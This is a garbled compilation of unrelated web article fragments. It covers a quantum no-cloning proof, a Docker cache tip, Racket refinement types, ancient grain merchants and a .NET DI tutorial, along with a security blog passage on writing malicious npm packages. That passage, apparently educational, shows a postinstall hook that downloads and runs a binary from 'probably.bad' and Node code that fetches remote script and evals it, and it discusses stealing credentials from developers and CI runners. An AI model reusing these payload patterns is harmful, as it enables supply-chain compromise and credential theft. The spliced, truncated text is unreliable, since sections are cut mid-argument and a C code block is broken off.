<p>Therefore, there is no general quantum copy operator that makes copy of any unknown state.</p>

<h3 id="more-restrict-no-cloning-theorem">More Restrict No-Cloning Theorem</h3>

<p>In quantum theory, $| \phi \rangle$ and $c | \phi \rangle$, where $c$ is a non-zero complex number, represent the same physical state. If $|c \phi|^2 = 1$, then $| \phi \rangle$ and $c | \phi \rangle$ only have phase difference.</p>



<p>For example, $| \phi \rangle$ and $| \psi \rangle$ have exactly the same probability of collapsing to $| 0 \rangle$ and $| 1 \rangle$. However, $| \phi \rangle$ has phase $\varphi_1$ while $| \psi \rangle$ has phase $\varphi_2$.</p><p>

\[\begin{align}
| \phi \rangle &amp;= \cos \frac{\theta}{2} | 0 \rangle + e^{i\varphi_1} \sin \frac{\theta}{2} | 1 \rangle \\
| \psi \rangle &amp;= \cos \frac{\theta}{2} | 0 \rangle + e^{i\varphi_2} \sin \frac{\theta}{2} | 1 \rangle \\
\end{align}\]

</p><p>More restrict No-Cloning Theorem states that “copying” any unknown state while abandoning the phase is not possible either.</p>



<p>Suppose we have such “copy” operator, the mathematical expression for “copy” will be as follows.</p><p>

\[U (| \phi \rangle \otimes |x\rangle) = e^{\varphi} | \phi \rangle \otimes |\phi\rangle\\
U (| \psi \rangle \otimes |x\rangle) = e^{\varphi^{\prime}} | \psi \rangle \otimes |\psi\rangle\]

</p><p>Similarly, we have</p><p>

\[\begin{align}
\langle \phi | \psi \rangle &amp;= e^{\varphi} e^{\varphi^{\prime}}\langle \phi | \psi \rangle ^2 \\
&amp;= e^{\varphi + \varphi^{\prime}} \langle \phi | \psi \rangle ^2 \\
\end{align}\]

</p><p>The norm of the two sides should be equivalent.</p><p>

\[\begin{align}
|\langle \phi | \psi \rangle| &amp;= |e^{\varphi + \varphi^{\prime}} \langle \phi | \psi \rangle ^2| \\
&amp;= |e^{\varphi + \varphi^{\prime}}| |\langle \phi | \psi \rangle ^2| \\
&amp;= 1 |\langle \phi | \psi \rangle ^2| \\
&amp;= |\langle \phi | \psi \rangle ^2| \\
&amp;= |\langle \phi | \psi \rangle |^2 \\
\end{align}\]

</p><p>Solving the above equation, we have $|\langle \phi | \psi \rangle | = 0$ or $1$.</p>



<p>Because $| \phi \rangle$ and $| \psi \rangle$ could be any arbitrary unknown states, $|\langle \phi | \psi \rangle | = 0$ or $1$ could never be satisfied.</p>



<p>Therefore, there is no general quantum “copy” operator that makes “copy” of any unknown state that has lost the phase information.</p>

<h3 id="transportation">Transportation</h3>

<p>Since it is not possible to do copy in quantum world, how about transportation?</p>



<p>Concretely, given any unknown normalized quantum state $| \phi \rangle$, and the transportation operator $U$, we are supposed to have the following mathematical expression if we are going to transport the quantum state $| \phi \rangle$ to another system whose quantum state is $|x \rangle$ before transportation.</p><p>

\[U(| \phi \rangle \otimes |x\rangle) = | x \rangle \otimes |\phi\rangle\]

</p><p>Note that although it is called transportation, it is more like a switch, where the two system states, one unknown and one known, got switched.</p>



<p>Without loss of generality, we could have another state $| \psi \rangle$ that is applied to the transportation operator.</p><p>

\[U(| \psi \rangle \otimes |x\rangle) = | x \rangle \otimes |\psi\rangle\]

</p><p>Similarly, we compute the inner product of $| \phi \rangle$ and $| \psi \rangle$.</p><p>

\[\begin{align}
\langle \phi | \psi \rangle &amp;= (\langle \phi | \otimes \langle x |) (| \psi \rangle \otimes | x \rangle) \\
&amp;= \big(U (\langle \phi | \otimes \langle x |)\big) \big(U (| \psi \rangle \otimes | x \rangle)\big) \\
&amp;= (\langle x | \otimes \langle \phi |) (| x \rangle \otimes | \psi \rangle) \\
&amp;= (| x \rangle \otimes | \psi \rangle)^{\dagger} (| x \rangle \otimes | \phi \rangle) \\
&amp;= (| x \rangle^{\dagger} \otimes | \psi \rangle^{\dagger}) (| x \rangle \otimes | \phi \rangle) \\
&amp;= (| x \rangle^{\dagger} | x \rangle ) \otimes (| \psi \rangle^{\dagger} | \phi \rangle ) \\
&amp;= \langle x | x \rangle \otimes \langle \phi | \psi \rangle \\
&amp;= 1 \otimes \langle \phi | \psi \rangle \\
&amp;= \langle \phi | \psi \rangle \\
\end{align}\]

            <p>What does a malicious package actually look like in practice? We'll walk through some hypothetical exercises to see how malware generally works, and what sort of functions we might expect, from relatively simple and temporary, to complex. Additionally, as we are focused primarily on Javascript for this post, we really need to think about two different threat models: what does in-browser malware look like, and how is that going to differ from on-host malware? What are primary attack methods, what could an attacker feasibly accomplish with each level of access, and what has malware historically done in each context? To that end, we will actually split this into a series of articles: in the first (this post), we will begin to examine what "on-host" Javascript malware looks like, followed by a more in-depth look at what we can do to make our malware stealthier and more resistant to removal. Finally, in the last set of posts, we will delve into browser-based malware, and what we can accomplish within the browser sandbox.</p><h3 id="attacker-motivations-and-mentality">Attacker Motivations and Mentality</h3><p>As we begin this thought experiment, the first thing to consider is what a potential attacker's targets and goals would be. We'll focus on NPM specifically in this article, primarily because it gives a good survey of several platforms (in-browser vs on-system) with differing threat models, but the general process, methodologies, and concerns remain the same across other platforms, languages, and ecosystems.</p><h3 id="on-host">On-Host</h3><p>The whole concept of "on-host" malware in NPM packages seems a bit unintuitive at first blush, as the immediate association is generally with browser-focused concerns - which <em>must</em> be safe, since the run in the browser sandbox. In reality, however, on-host<a href="https://arxiv.org/abs/2005.09535"> is actually where most observed Javascript malware runs</a>. There are, interestingly enough, some serious advantages from an attacker's perspective in running there, rather than in an end user's web browser:</p><ul><li>If we run outside of a browser, we have the same level of access as the developer installing our package.</li><li>Running within a large, mainstream package in an end-user's browser increases our odds of being discovered - many more products and users are observing package behavior at the endpoint than during the build process.</li><li>To add to the last point, many security products actually ignore things like <code>devDependencies</code> entirely, and many of the infrastructure pieces, such as CI builders, where build-related code will run on has little-to-nothing in terms of security measures and mitigations.</li></ul><p>While this certainly doesn't mean we are <em>restricted</em> to operating on-host (as we'll see later, there is plenty we can do in-browser), this makes it a very compelling place to begin our journey. As such, we'll walk through an iterative process of making our badware package, and applying some gradual improvements.</p><h3 id="crawl">Crawl</h3><p>To start the project off, we'll build a simple npm package. What exactly it will do, or what value it will provide is largely irrelevant; for argument's sake, it might change the console font color, or include some pictures of cats, &nbsp;but in practice, it simply exists to bundle in our malware.</p><p>In order for our malware to be even moderately successful, we need three elements:</p><ol><li>To gain execution.</li><li>Network access.</li><li>To ensure the user remains unaware that we are running.</li></ol><p>To get what we might consider the most basic form of item one, we'll take a page from some prior work and leverage a great feature of our javascript tooling - the <code>postinstall</code> script. &nbsp;To that end, we'll start with our <code>package.json</code>:</p><pre><code>{
    "name": "mostly-harmless",
    "version": "1.0.0",
    /* ... */
    "scripts": {
        "postinstall": "wget https://probably.bad/malware &amp;&amp; chmod +x malware &amp;&amp; ./malware &amp;"
    }
}</code></pre><p>and (for now, at least) we won't make our malware too complex, perhaps we'll simply start with something like the following:</p><figure><pre><code>#include &lt;sys/types.h&gt;

From here, we have full console access to the local machine in the same context as the current user (presumably either a developer or a CI runner). </p><p>While this certainly works, and gives us access, it comes with some serious limitations. For one, it's fairly trivial to detect - a simple <code>netstat -an</code> will identify it easily. Another issue is that we have to be ready to accept the connection as soon as the user runs <code>npm install</code>, as it will only try to connect out once, and will die when the current user logs off (barring detached terminals or similar). Finally, it is very overt - not only would most network security devices (IDS or IPS) catch this traffic in-flight, even a casual observer would find this when perusing the <code>package.json</code>. </p><p>Oddly enough, however, the last point (at least, regarding the <code>package.json</code>) is less bad than one might think - while trivial observations would certainly catch it, if our malware is upstream from any non-trivial package installation, manual <a href="https://blog.phylum.io/what-is-the-state-of-npm/">identification might end up being nearly impossible.</a> In fact, as documented in "The Backstabber's Knife Collection" (linked earlier in the article), this sort of scheme <em>has</em> worked for a large subset of discovered javascript malware. Still, we can almost certainly do better.</p><h3 id="walk">Walk </h3><p>Now we have a notional infection vector (via our <code>postinstall</code> script), and some code to give us access to the remote host. Where do we go from here to look at improving our setup? We can draw some inspiration from <a href="https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes">malware added upstream from <code>eslint</code></a> which harvested (and shipped off) tokens and credentials from the local system, effectively giving attackers the ability to modify previously-published packages controlled by the current user at a future date.</p><p>While we're actually obtaining credentials here, focusing on a single file with a small number of credentials that may (or may not) be on most of the machines we land on seems a bit lackluster when we can look for other locally stored credentials (e.g., AWS tokens, SSH keys, etc) and environment variables.</p><p>In order to get this new functionality up and running, we can start by making a quick change to our previous <code>package.json</code>:</p><pre><code>{
    "name": "mostly-harmless",
    "version": "1.0.1",
    /* ... */
    "scripts": {
        "postinstall": "node ./lib/build.js"
    }
}</code></pre><p>Now instead of running our <em>new</em> malware directly in this file, we'll make it slightly stealthier by remote-hosting the file, and pulling it down at runtime. A quick first pass at this might resemble the following:</p><pre><code>try {
    const https = require("https");
    https.get({
        hostname: "probably.bad",
        path: "/new-malware",
        headers: {
            Accept: "text/html"
        }
    }, 
    res =&gt; { res.on("data" d =&gt; eval(d)); })
        .on("error", () =&gt; {});
       
} catch (e) {}</code></pre><p>Interestingly enough, this is actually <em>almost</em> exactly the same as the malware that launched in the aforementioned <code>eslint</code> attack: it would pull the file retrieval script from a remote host (where we've slotted in our hypothetical attack domain, "probably.bad", the original utilized pastebin), and simply eval the text. While this is mostly effective, there is a critical flaw here - if for some reason we don't get the entire script to execute in the first chunk, our <code>eval</code> will likely fail with syntax error, as we might be attempting to execute half a script (for reference, a copy of the original malware with deeper explanation of the attack and constituent parts can be found <a href="https://gist.github.com/hzoo/51cb84afdc50b14bffa6c6dc49826b3e">here</a>), which ended up resulting in the attack being discovered quickly. </p><p>Now certainly the first issue is relatively simple to fix: we need to ensure we've downloaded the <em>full</em> file before we attempt to eval. &nbsp;To that end, what we probably want is something more like the following:</p><pre><code>try {
    const https = require("https");
    https.get("https://probably.bad/new-malware", res =&gt; {
        let tmp = "";
        res.on("data", d =&gt; tmp += d);
        res.on("end", () =&gt; eval(tmp));
    }).on("error", () =&gt; {});
} catch(e) {}</code></pre><p>This should get us more consistent execution at least, but now to think about <em>what</em> we should be harvesting - are NPM creds or crypto wallets really the best we can do? If we think about this a bit, there are two general contexts under which we will run:</p><ol><li>On a developer's system.</li><li>On a CI runner.</li></ol><p>From an attacker's perspective, both places are interesting - albeit for slightly different reasons. In the first case, the answer is somewhat obvious: we are going to be running on a developer's workstation while a project is being built and tested locally. This means that things like credentials (NPM creds, SSH keys, and many more) will likely be available for access and exfiltration, among other things. The second scenario, however, is also interesting - CI runners often get sensitive items such as database credentials, infrastructure keys, and similar injected during the build process. Past experience also shows that some attackers have …</p></div></div>

  <p><span>21 Aug 2020</span></p><p>You might have encountered a situation where you cannot build the latest Docker image when using the <a href="https://docs.docker.com/buildx/working-with-buildx/">Buildx</a>. If so, you may find this article helpful to give you a little insight into your question, <em>“Why I keep seeing the stale image in the list!”</em>.</p>

<p>What I tried was building <a href="https://github.com/Lewuathe/docker-presto-cluster/commit/bcdaf191829754d93876c1e4d44cb33019bd75ad">the Docker image supporting ARM64 architecture</a>. To achieve my goal, it requires me to enable Buildx experimental feature of Docker. It allows us to build a Docker image supporting multiple architectures. When I have found a problem in the image, I wanted to change the Dockerfile to reflect the fix I applied. But it failed. As shown in the following output, the <code>CREATED</code> time of the images keeps the past time even I have created just a few seconds before.</p>

<div><div><pre><code>$ docker images
REPOSITORY                                                    TAG                      IMAGE ID            CREATED             SIZE

lewuathe/presto-worker                                        341-SNAPSHOT             eb1d11521b04        5 hours ago         1.38GB

</code></pre></div></div>

<p>That’s was so annoying that I could not test my fix was adequately resolving the issue. Here are two options to overcome this stressful situation.</p>

<h2 id="build-without-any-cache">Build without any cache</h2>

<p>As well as normal build command, <code>buildx</code> also provides <a href="https://thenewstack.io/understanding-the-docker-cache-for-faster-builds/#:~:text=When%20the%20'%E2%80%93no%2Dcache,the%20maximum%20amount%20of%20time."><code>--no-cache</code></a> option. It enables us to build an image from scratch. The latest image will be created for sure.</p>

<div><div><pre><code><span>$ </span>docker buildx build <span>\</span>
    <span>--no-cache</span> <span>\ </span><span># Without using cache</span>
    <span>--platform</span> linux/arm64/v8 <span>\</span>
    <span>-f</span> Dockerfile-arm64v8 <span>\</span>
    <span>-t</span> lewuathe/prestobase:340-SNAPSHOT-arm64v8
</code></pre></div></div>

<h2 id="clearing-the-cache-completely">Clearing the cache completely</h2>

<p>Another option is clearing the cache. However, it has a side-effect affecting other image build time. Since removing all layer caches, it can make the build time for other images longer. But if the images you are holding is not so many, deleting the cache can be a reasonable option.</p>

<p>The builder instance holds the cache. The following command will clear the cache hold by all builders.</p>

<div><div><pre><code><span>$ </span>docker builder prune <span>--all</span>
</code></pre></div></div>

<p>Afterward, you can build the image as usual. We can see the build time is refreshed as follows.</p>

<![CDATA[Faking Useful Refinement Types in Racket]]>

August 21, 2020 | https://gmb.is/refinement-types | <a href="https://web.archive.org/web/*/https://gmb.is/refinement-types">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Refinement types allow you to make expressive type declarations like "any number greater than 3 but less than 33" or "any integer that is prime". Essentially, they are the intersection of a base type and a predicate. Breaking the type descriptions down to their requisite parts, you get something like:</p><p>Base Type: Integer</p><p>Predicate: (3 &lt; x &lt; 33)</p><p>Refinement Type: Integer and (3 &lt; Integer &lt; 33)</p><p>In Typed Racket, this can be translated fairly literally.</p><pre>(: (Refine [n : Integer] (and (&gt; n 3) (&lt; n 33)))
</pre>
<p>In practice, this type would be used like so:</p><pre>(define-type A (Refine [n : Integer] (and [&gt; n 3] [&lt; n 33])))

(: add-one (-&gt; A Integer))
(define (add-one n)
  (+ n 1))
  
&gt; (add-one 4)
- : Integer
5

&gt; (add-one 55)
; main.rkt::2469: Type Checker: type mismatch
;   expected: A
</pre>
<p>Refinement types are cool, and type-theoretically interesting, but they're also really useful. </p><p>For example, I've recently been working on Gemengine, a small Gemini application server. Like HTTP, Gemini has a "Redirect" response. Gemengine supports this response with a simple API:</p><pre>(redirect "/home")
</pre>
<p>If, instead of specifying a "/home" redirect, you allow dynamic, user-controllable input, you've inadvertently introduced a vulnerability: an Open Redirect. Although minor, especially in Gemini-land, we'd rather have no vulnerabilities at all.</p><p>As a library author, it would be great to prevent this issue for Gemengine's users. However, the obvious solution - validating or sanitizing input on the dev's behalf - is not ideal. If we take that approach, we're taking control away from the developer. Even worse, they may not realize we've done so until the application is already in production and they start getting errors.</p><p>A friendlier approach would be to type-enforce secure usage of the `redirect` function. This way, developers aren't surprised, because they must consciously make the secure choice, but they also aren't left vulnerable.</p><p>What would type enforcement look like? Well, essentially what we're looking for is a URL path. Or, put another way, a string that, when parsed as a URL, doesn't have a host component. This type description maps cleanly to our notion of a Refinement type.</p><p>You might expect we could define a type like this:</p><pre>(Refine [n : String] (not [url-host (string-&gt;url n)]))
</pre>
<p>Unfortunately, Racket doesn't support such arbitrary refinement definitionsÂ¹. However, there is a workaround.</p><p>Typed Racket allows you to integrate with untyped Racket, and provides a mechanism to specify types for your untyped code. We can take advantage of this functionality to create types defined by an arbitrary predicate.</p><p>To do so, first we need to define our untyped predicate.</p><pre>; gemini-path.rkt

#lang racket

(require net/url)
(provide gemini-path?)

(define (gemini-path? url)
  (false? (url-host (string-&gt;url url))))
</pre>
<p>Then, we can require it in Typed Racket.</p><pre>; types.rkt

#lang typed/racket

(require/typed "gemini-path.rkt"
  [#:opaque Internal-Gemini-Path gemini-path?])
</pre>
<p>The `require/typed` function above allows us to specify an opaque type name along with a predicate that returns `true` for some input.</p><p>The only problem with the type as defined is that it has no notion that it is also a `String`. That means if we have some function that returns an `Internal-Gemini-Path`, we can't use it in places we ought to be able to. To get around this issue, we can add one more line and complete our type definition.</p><pre>(define-type Gemini-Path (Refine [s : String] (: s Internal-Gemini-Path)))
</pre>
<p>We don't actually need a Refinement here, we could just as well define `Gemini-Path` to be `(Intersection String Internal-Gemini-Path)`, but it (subjectively) clarifies the intent to declare it via `Refine`.</p><p>Finally, we can update the type of `redirect`:</p><pre>(: redirect (-&gt; Gemini-Path response))
</pre>
<p>Now, developers will get a type error for attempting to use the API insecurely.</p><pre>(define input : String (get-insecure-input))
(redirect input)
</pre>
<p>But, with the help of Racket's occurrence typing, they have a simple path towards secure usage.</p><pre>(define input : String (get-insecure-input))

(if (gemini-path? input)
    (redirect input)
	(error "Error!"))
</pre>

<p>In the previous three posts, I have mostly just used the magic word ‘markets’ to describe how the food produced in the countryside gets to the cities and people who are not farmers.  As we’ll see in this post, that is a bit of an oversimplifying fib, both in that the phrase ‘markets’ covers a <em>lot </em>of complexity, but also (as we’ll see) some of the major drivers of moving that food from the countryside into towns doesn’t involve money <em>or</em> market interactions.  That said, we’re going to <em>start</em> with market transactions, because while they are actually the minority-type in many of these societies, they are more readily familiar and understandable, I suspect, to modern readers.  Then we’ll move to <em>extraction</em> as the other category.</p>



<p>Speaking of extraction, as always, if you like what you are reading here, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreo</a>n. And if you want updates whenever a new post appears, you can click the button below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts, as well as my occasional ancient history, foreign policy or pop-culture thoughts.</p>






<h2>Point of Sale</h2>



<p>I want to start by leaning on (with small modifications for clarity) Paul Erdkamp’s taxonomy of the various options by which food might get into the stream of commerce.  A small farmer might sell their grain (I) directly to city-dwellers, (II) indirectly, via urban middlemen and grain merchants, either in the market or (III) ‘at the gate’ (meaning selling to merchants who come out to the farm in order to buy; the difference being who transports the food to the city), (IV) to itinerant traders at periodic rural markets or (V) to other local small farmers.  As we’ll see, <em>large </em>landholders have a <em>somewhat</em> larger range of options within this taxonomy, but the fundamentals are the same.</p>



<p>While all of these sale methods certainly happened, in every society I have looked at, Option I – selling directly to city-dwellers – is fairly rare for grains and other bulk agricultural goods.  Market <em>gardeners</em>, selling fruits, vegetables (and sometimes flowers) often do sell this way, maintaining a high-intensity garden near town and a shop or stall in the town market.  Likewise, while Option V – small-scale trade between farmers – absolutely happens, it is typically non-monetary: the banqueting of neighbors discussed in the first post.  Where it is monetary, it is typically quite small scale and very short distance.  By and large, small and mid-sized farmers hadn’t the time, expertise or infrastructure to sell their goods directly.  They needed to be farming, not manning a market stall or trying to figure out how to store their goods close to the point of sale.  And of course large landowners, being rich, aren’t going to stand in the market square either (and in many cases don’t want their obvious representative doing so either,  see below).  So while I and V happen, they’re not too common or too large a portion of total trade and we may lay them aside for this discussion.</p>



<p>That leaves Options II, III and IV, all of which involve selling grain to a middle-man merchant of some sort.  The main difference is the location of sale (in town, at the gate, or at periodic rural markets).  Outside of large cities and major ports, markets were likely to be <em>periodic</em>, occurring only on certain days (typically around once per week).  In Roman Italy, these were the <em>nundinae</em> (‘ninth days,’ although it was an 8-day cycle as the Romans count inclusively); the <em>nundinae</em> were minor festivals, days of rest and merrymaking, but they were also the days when the rural markets would be open – the rest-day from agricultural labor enabled farmers to head into local towns to buy or sell whatever they needed (interestingly, at Rome, the <em>nundinae</em> were <em>dies nefasti</em> – state business couldn’t generally be conducted on them – so poor farmers hoping to use their day off to participate politically were out of luck).  Similar periodic markets are common in the Middle Ages (and even today; most ‘farmer’s markets’ in the United States are periodic, <a href="http://www.carrborofarmersmarket.com/">including my town’s</a>).  The periodic nature of these markets is an adaptation to agricultural rhythms; for a market to function there need to be a lot of people together all at once and the small towns that dotted the countryside simply didn’t have the density to do that all of the time.</p>

Please note: the importance of pottery in modern archaeology has given many students and the general public the idea that the ancients were always shipping pots around for sale, as if there was a vast market in pottery.  <strong>Generally, people were buying what was in the pot, not the pot itself</strong>.</figcaption></figure>



<p>But as noted, our farmers are unlikely to be selling their grain directly to customers.  Instead, they are likely to be using some sort of middle-man merchant, which brings us to:</p>



<h2>Merchants!</h2>



<p>Merchants are a bit of a break from the people we have so far discussed in that they, by definition, live in the realm of the <em>market</em> (in the economic sense, although often also in a physical sense).  As we’ve seen so much of the world of our farmers and even our millers and bakers was governed by <em>non-market</em> interactions: horizontal and vertical social ties that carried expectations that weren’t quite transactional and certainly not monetized.  By contrast, merchants work with transactions and tend to be the <em>first</em> group in any society to attempt to monetize their operations once money becomes available.  I find students are often quick to feel identity with the merchant class, because these folks are more likely to travel, more likely to use money, more likely to employ or be employed in wage-labor; they feel more like modern people.</p>



<p>It thus tends to come as something of a surprise that with <em>stunning</em> consistency, <strong>the merchant class tended to be at best cordially disliked and at worst <em>despised</em> by the broader community</strong> (although not typically to the point of suffering legal disability, as did some other jobs; see S. Bond, <em>Trade and Taboo: Disreputable Professions in the Roman Mediterranean</em> (2016) for this in Rome).  This often strikes students as strange, both because we tend to think rather better of our own modern merchants but also because the image they have of the merchant class certainly looks elite.</p>

<p>For the farmers who need to sell their crops (for reasons we will get to in a moment) and purchase the things they need that they cannot produce, the merchant feels like an adversary: always pushing his prices to his best advantage.  We expect this, but remember that our pre-modern farmers are just <em>not that exposed to market interactions</em>; most of their relationships are reciprocal, not transactional – the horizontal relationships we discussed before.  The merchant’s ‘money-grubbing’ feels like a betrayal of trust in a society where you banquet your neighbors in the good years so they’ll help you in the bad years.  <strong>The necessary function of a merchant is to transgress the ‘rules’ of village interactions which – and this <em>resounds</em> from the sources – the farmers tend to understand as being ‘cheated.’</strong></p>



<p>At the same time, <strong>while most merchant types are humble, the high-risk and potentially high-reward involved in trade meant that <em>some</em> merchants </strong>(again, a small number) <strong>could become <em>very</em> rich</strong>.  That, as you might imagine, <strong>did not go over well for the traditionally wealthy in these societies</strong>, the large landholders.  Again, the values here often strike modern readers as topsy-turvy compared to our own, but to the elite large landholders (who dominate the literary and political culture of their societies), the <em>morally correct</em> way to earn great wealth is to inherit it (or capture it in war).  The <em>morally correct</em> way to hold that wealth is with large landed estates.  Anything else is <em>morally</em> suspect, and so the idea that a successful merchant could – by a process that again, strikes the large landholder, just like the small farmer, as ‘cheating’ – leap-frog the social pyramid and skip to the top, without putting in the work at either having distinguished wealthy ancestors <em>or</em> tremendous military success was an open insult to elite values.  Often laws were put in place to limit the ability of wealthy non-aristocrats (likely merchants or successful artisans) from displaying their wealth (<a href="https://en.wikipedia.org/wiki/Sumptuary_law">sumptuary laws</a>) so as to keep them from competing with the aristocrats; at Rome, senators were forbidden from owning ships with much the same logic (Roman senators being clever, they still invested in trade through proxies while at the same time disapproving of the activity in public politics).</p>



<p>Such disdain appears, with varying justification, in the sources of every pre-modern agrarian society I’ve studied, to one degree or another.  One commonplace of Greek and Roman thinking – despite these being very active, maritime societies – was that the first production of ships and the first sailing was in some essential way a profanation of the divine realm of the sea, a space humans ought not have ever ventured into – and certainly not for anything as mean as profit (e.g. Euripides, <em>Medea</em> 1-6; Catullus. 64.1-20; Valerius Flaccus, <em>Argonautica</em> 627-632; Seneca, <em>Medea</em> 1-12; 301-379, <em>inter alia</em> – thanks to my old grad school pals <a href="https://www.usf.edu/arts-sciences/departments/world-languages/about-us/hedrick.aspx">Buddy Hedrick</a> and <a href="http://gdrsd.org/gdrhs/faculty/michael-hoffman/">Michael Hoffman </a>for …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The objective of this post is to configure and use Microsoft’s default dependency injection container from scratch to understand how it all hangs together when in action. There are many other great articles explaining Dependency Injection and Inversion of Control (DI &amp; IoC from now on) in ASP.NET Core out there. This article assumes that you understand those principles. So I will not be covering those.</p>
<p>We will start with a simple console application, configure an IoC container, and have some fun with it by diving into the .NET Core DI Extensions’ source code.</p>
<blockquote>
<p>💡 Follow along with the code from my <a href="https://github.com/sahan91/dotnet-ioc-example">repository</a></p>
</blockquote>
<h3>Microsoft’s IoC Container in .NET Core</h3>
<p>The .NET Core IoC container is located in <a href="https://docs.microsoft.com/en-us/dotnet/api/microsoft.extensions.dependencyinjection?view=dotnet-plat-ext-3.1">Microsoft.Extensions.DependencyInjection</a> namespace.  Let’s look at what are the steps involved in order to use this in our application.</p>
<ol>
<li>We need to add this assembly via NuGet.</li>
<li>Types must be registered with <code>ServiceCollection</code></li>
<li>Types are retrieved from <code>ServiceProvider</code></li>
</ol>
<p>We will start off with a simple console application and see how we can achieve the above steps.</p>
<h3>Setup</h3>
<p>Let’s start by creating a console application.</p>
<div data-language="bash"><pre><code>dotnet new console -n IoCTutorial
dotnet new sln
dotnet sln <span>add</span> IoCTutorial</code></pre></div>
<p>Open it up in your favourite IDE and you are ready to follow along. I won’t be using any other dependency (such as logging) just to keep this tutorial simple.</p>
<p>Let’s go ahead and add the DI assembly from NuGet.</p>
<div data-language="bash"><pre><code>dotnet <span>add</span> package Microsoft.Extensions.DependencyInjection</code></pre></div>
<p>Your project structure should now look like this.</p>
<p><span>

    </span></p>
<p>Let’s add two classes into our project; <a href="https://github.com/sahan91/dotnet-ioc-example/blob/master/IoCTutorial/MyService.cs">MyService</a> and <a href="https://github.com/sahan91/dotnet-ioc-example/blob/master/IoCTutorial/MyDependency.cs">MyDependency</a>. Here’s what’s gonna go into those two classes.</p>
<p> <code>MyService.cs</code></p>
<div data-language="csharp"><pre><code><span>public</span> <span>class</span> <span>MyService</span>
<span>{</span>
    <span>private</span> <span>readonly</span> <span>MyDependency</span> _myDependency<span>;</span>
    <span>public</span> <span>MyService</span><span>(</span><span>MyDependency</span> myDependency<span>)</span>
    <span>{</span>
        Console<span>.</span><span>WriteLine</span><span>(</span><span>"Constructed MyService"</span><span>)</span><span>;</span>
        _myDependency <span>=</span> myDependency<span>;</span>
    <span>}</span>
    
    <span>public</span> <span><span>void</span></span> <span>DoSomething</span><span>(</span><span>)</span>
    <span>{</span>
        _myDependency<span>.</span><span>DoWork</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p><code>MyDependency.cs</code></p>
<div data-language="csharp"><pre><code><span>public</span> <span>class</span> <span>MyDependency</span>
<span>{</span>
    <span>public</span> <span>MyDependency</span><span>(</span><span>)</span>
    <span>{</span>
        Console<span>.</span><span>WriteLine</span><span>(</span><span>"Constructed MyDependency"</span><span>)</span><span>;</span>
    <span>}</span>
    
    <span>public</span> <span><span>void</span></span> <span>DoWork</span><span>(</span><span>)</span>
    <span>{</span>
        Console<span>.</span><span>WriteLine</span><span>(</span><span>"Doing some work in MyDependency"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>As we can see, <code>MyService</code> has an (aptly named 😅 ) dependency on <code>MyDependency</code>. In order to invoke our service, we need to pass an instance of the required dependency into its constructor. In our driver code (Program.cs) without any IoC stuff, we could do something like this.</p>
<div data-language="csharp"><pre><code><span><span>var</span></span> myService <span>=</span> <span>new</span> <span>MyService</span><span>(</span><span>new</span> <span>MyDependency</span><span>(</span><span>)</span><span>)</span><span>;</span>
myService<span>.</span><span>DoSomething</span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>This is baaaaad 💀. Problem with this is, now we are responsible for managing the dependencies, their lifetimes (and also violates SOLID principles) etc. Let’s fix this by using the IoC container. We will simply give them a scoped lifetime.</p>
<div data-language="csharp"><pre><code>
<span><span>var</span></span> container <span>=</span> <span>new</span> <span>ServiceCollection</span><span>(</span><span>)</span><span>;</span>
container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>MyDependency<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>
container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>MyService<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>


<span><span>var</span></span> provider <span>=</span> container<span>.</span><span>BuildServiceProvider</span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>If you aren’t familiar with service lifetimes, it’s best if you refer to the <a href="https://docs.microsoft.com/en-us/aspnet/core/fundamentals/dependency-injection?view=aspnetcore-3.1#service-lifetimes">official documentation</a> before continuing on.</p>
<blockquote>
<p>💡 Note that you don’t have to instantiate ServiceCollection in an ASP.NET Core Web or Worker Service application. You would ideally register your services using the IServiceCollection in the Startup class.</p>
</blockquote>
<h3>The quick &amp; dirty service registration</h3>
<p>Once we have set this up, we need to call <code>BuildServiceProvider</code> method on the container. This returns us a <code>ServiceProvider</code> as a result. Remember that we first need to register our types in the container (<code>ServiceCollection</code>) and then retrieve them using the provider. Bear with me on this one as we are using the concrete implementations rather than interfaces for this initial cut.</p>
<div data-language="csharp"><pre><code>
<span><span>var</span></span> myService <span>=</span> provider<span>.</span><span><span>GetService</span><span><span>&lt;</span>MyService<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>
myService<span>.</span><span>DoSomething</span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>Now when we run this, it should create an instance of <code>MyDependency</code>, construct an instance of <code>MyService</code> and run the <code>DoSomething()</code> method.</p>
<p><span>
      <span></span>
  <img alt="dotnet-core-ioc-container-3.png" title="dotnet-core-ioc-container-3.png" src="https://sahansera.dev/static/52d70b184e7aa00a5b603b35eeb953b4/5a190/dotnet-core-ioc-container-3.png" srcset="https://sahansera.dev/static/52d70b184e7aa00a5b603b35eeb953b4/772e8/dotnet-core-ioc-container-3.png 200w,

    </span></p>
<p>Notice how we never constructed <code>MyDependency</code> because the DI framework resolved it and did the constructor injection for us. Nice!</p>
<h3>Internals of ServiceCollection and ServiceProvider</h3>
<p>Looking at our code, the <code>ServiceCollection</code> holds a bunch of <code>ServiceDescriptor</code>s and provides some utility methods to manipulate it. <code>ServiceDescriptor</code>s are really the objects that describe (type, implementation, lifetime etc.) our service registrations.</p>
<div data-language="csharp"><pre><code><span>public</span> <span>class</span> <span>ServiceCollection</span> <span>:</span> <span><span>IServiceCollection</span></span>
<span>{</span>
    <span>private</span> <span>readonly</span> <span>List<span>&lt;</span>ServiceDescriptor<span>&gt;</span></span> _descriptors <span>=</span> <span>new</span> <span>List<span>&lt;</span>ServiceDescriptor<span>&gt;</span></span><span>(</span><span>)</span><span>;</span>

    <span>public</span> <span><span>int</span></span> Count <span>=&gt;</span> _descriptors<span>.</span>Count<span>;</span>
